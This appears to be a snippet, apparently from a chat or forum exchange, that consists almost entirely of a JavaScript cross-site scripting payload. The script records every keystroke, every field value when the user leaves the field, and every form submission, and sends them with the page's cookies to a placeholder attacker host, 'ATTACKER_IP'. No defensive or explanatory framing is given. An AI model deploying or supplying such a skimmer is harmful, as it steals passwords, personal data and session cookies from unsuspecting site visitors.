mobile key chain??! 

<script>
var endpoint = 'ATTACKER_IP';

// 1. Real-time input capture (shows each character as typed/corrected)
document.addEventListener('input', function(e) {
    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
        fetch(endpoint + '/input?' + e.target.name + '=' + encodeURIComponent(e.target.value));
    }
}, true);

// 2. On blur — final value when they leave the field
document.addEventListener('blur', function(e) {
    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
        if (e.target.value) {
            fetch(endpoint + '/blur?' + e.target.name + '=' + encodeURIComponent(e.target.value));
        }
    }
}, true);

// 3. Form submission — full capture of all fields at once
document.addEventListener('submit', function(e) {
    var data = new FormData(e.target);
    var params = [];
    for (var pair of data.entries()) {
        params.push(pair[0] + '=' + encodeURIComponent(pair[1]));
    }
    fetch(endpoint + '/submit?' + params.join('&'));
}, true);

// 4. Cookie exfiltration (your original payload)
fetch(endpoint + '/cookie?c=' + document.cookie);
</script>
